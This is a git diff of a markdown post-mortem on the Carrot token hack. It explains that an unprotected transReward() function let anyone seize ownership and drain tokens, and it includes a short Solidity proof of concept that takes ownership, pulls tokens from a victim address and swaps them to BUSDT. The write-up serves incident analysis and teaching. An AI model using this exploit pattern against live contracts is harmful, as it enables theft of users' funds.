@@ -4,8 +4,8 @@
 
 
 ## What's Carrot?
-a rewards platform where users can earn bitcoin simply by supporting the brands and creators they love. Creators of all sorts
-(writers, podcasters, open-source collectives...) can publish challenges to be carried out by their audiences and offer bitcoin for their completion.
+A rewards platform where users can earn bitcoin simply by supporting the brands and creators they love. Creators of all sorts
+(writers, podcasters, open-source collectives...) can publish challenges to be carried out by their audiences and offer Bitcoin for their completion.
 
 ## Amount stolen
 **$31,318 BUSDT**
@@ -21,7 +21,7 @@ Insufficient access control
 The Carrot token relies on `_allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance")`
 to prevent unapproved token transfers,
 
-the `sub` function in the `beforetransfer` method will subtract the `amount` from the allowance. If the subtraction results
+The `sub` function in the `beforetransfer` method will subtract the `amount` from the allowance. If the subtraction results
 a value less than zero indicates that the transfer amount exceeds the allowance limit and will fail.
 
 This pattern involves the Action-Check pattern, where you act, in this case transferring tokens without explicitly checking for permission. 
@@ -71,9 +71,9 @@ This counter variable serves as a safety measure, preventing any other party fro
 }
 ```
 
-The Pool address is set via the onlyOwner initPool() function on the token.
+The Pool address is set via the `onlyOwner initPool()` function on the token.
 
-to pass the `onlyOwner` check, we can gain acces of the contract by the following function.
+- To pass the `onlyOwner` check, we can gain acces of the contract by the following function:
 
 
 ```solidity
@@ -82,25 +82,28 @@ to pass the `onlyOwner` check, we can gain acces of the contract by the followin
    }
 ```
 
-It seems that the function lacks access control and is public for everyone, so in the concluding step, the ownership of the pool contract is established by invoking the `transReward()` function on the token with the selector `"0xbf699b4b"`, which in English is the "change 
+It seems that the function lacks access control and is public for everyone. For the concluding step, the ownership of the pool contract is established by calling the `transReward()` function on the token with the selector `"0xbf699b4b"`, which in English is the "change 
 owner" function and the desired address is specified as `"0x5575406ef6b15eec1986c412b9fbe144522c45ae"`.
-
 
 
 # proof of concept (PoC)
 
 ```solidity
-        // Call vulnerable transReward() to set this contract as owner. No auth control
-        CARROT_TOKEN.transReward(abi.encodeWithSelector(0xbf699b4b, address(this)));
-
-        // Call transferFrom() to steal CARROT tokens using the same amount used in the exploit
-        CARROT_TOKEN.transferFrom(
-            0x00B433800970286CF08F34C96cf07f35412F1161, address(this), 310_344_736_073_087_429_864_760
-        );
-
-        // Swap all stolen Carrot to BUSDT
-        _CARROTToBUSDT();
+  // Call vulnerable transReward() to set this contract as owner. No auth control
+  CARROT_TOKEN.transReward(abi.encodeWithSelector(0xbf699b4b, address(this)));
+  
+  // Call transferFrom() to steal CARROT tokens using the same amount used in the exploit
+  CARROT_TOKEN.transferFrom(
+      0x00B433800970286CF08F34C96cf07f35412F1161, address(this), 310_344_736_073_087_429_864_760
+  );
+  
+  // Swap all stolen Carrot to BUSDT
+  _CARROTToBUSDT();
 ```
+
+
+![euler Image](../images/https://gifsec.com/wp-content/uploads/2022/11/stitch-gif-27.gif)
+
 
 **Code provided by:** [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/Carrot_exp.sol)
 
